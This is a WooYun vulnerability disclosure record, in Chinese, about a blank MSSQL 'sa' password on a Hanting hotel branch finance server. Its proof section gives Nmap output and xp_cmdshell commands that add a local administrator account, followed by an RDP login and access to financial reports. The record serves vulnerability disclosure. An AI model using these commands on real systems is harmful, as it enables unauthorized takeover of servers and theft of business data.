{"id": 12050, "wybug_id": "wooyun-2013-020513", "wybug_title": "汉庭分店财务系统默认密码漏洞", "wybug_corp": "汉庭酒店", "wybug_author": "bt0sea", "wybug_date": "2013-03-23 11:29", "wybug_open_date": "2013-06-21 11:30", "wybug_type": "默认配置不当", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路", "运维管理不当", "内部敏感信息泄漏", "数据库账户权限过高", "空口令", "任意命令执行", "敏感端口对外访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-21：\t细节向公众公开  简要描述： 汉庭酒店分店财务系统，根据总店的要求，需要自己提供财务系统，那么加盟的用户为了快速建立财务系统，一般都使用的是用友等初级的财务软件，那么，由于财务人员对计算机安全知识的缺乏，会造成默认配置不当。 详细说明：  汉庭酒店分店财务系统，根据总店的要求，需要自己提供财务系统，那么加盟的用户为了快速建立财务系统，一般都使用的是用友等初级的财务软件，那么，由于财务人员对计算机安全知识的缺乏，会造成默认配置不当。本地安装MSSQL 2000 默认密码为空，通过xp_cmdshell添加管理员用户密码，3389登入。下载了财务报表。   漏洞证明：  Nmap scan report for 192.168.50.251Host is up (0.00081s latency).Not shown: 990 closed portsPORT     STATE SERVICE80/tcp   open  http135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds1026/tcp open  LSA-or-nterm1033/tcp open  netinfo1041/tcp open  danf-ak21433/tcp open  ms-sql-s3389/tcp open  ms-wbt-server8089/tcp open  unknownMAC Address: 1C:6F:65:E0:DF:A8 (Giga-byte Technology Co.)\n\n3.1.1. TDS (SQL Server) access with sa and no password (tds-generic-0001)Description: TDS servers such as Microsoft SQL Server and Sybase create a default administrative account with the user ID \"sa\" and password \"\". It is best practice to remove default accounts, if possible. For accounts required by the system, the default password should be changed. This account often grants full access to the system.通过symantec  CCSVM扫描发现SA 空密码\n\n\n\n本来想从数据库用户密码进入，不过发现密码并非通用加密方式MD5 base64 凯撒密码等只能通过sa 加管理员账号\n\n新建查询use master;xp_cmdshell 'net user test test /add'xp_cmdshell 'net localgroup administrators test /add'财务系统最终没有进去，但是在本地硬盘上找到了很多重要的财务报表\n\n   修复方案：  MSSQL设置强悍的密码。   版权声明：转载请注明来源 bt0sea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-03-25 09:50 厂商回复： 感谢漏洞提交，已联络相关门店进行确认改善。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-21 11:50 |    \t\tgodlong \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:7        | 戴着白色帽子的白帽子...)\t\t \n  酒店行业确实暴力。。:)    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}